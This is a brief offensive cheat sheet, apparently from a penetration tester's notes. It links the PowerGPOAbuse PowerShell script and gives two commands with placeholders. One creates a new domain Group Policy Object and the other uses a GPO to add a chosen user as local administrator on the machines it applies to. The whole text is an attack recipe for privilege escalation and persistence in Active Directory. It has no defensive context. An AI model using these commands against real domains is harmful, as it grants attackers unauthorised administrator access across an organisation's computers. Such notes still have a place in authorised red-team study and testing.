### source
https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1  

### create new gpo
```
New-DomainGPO -DisplayName <gpoName> -Domain <domain>
```

### use gpo to add new admin
```
Add-LocalAdmin -GPOIdentity '<gpo>' -Member <user> -Domain <domain>
```

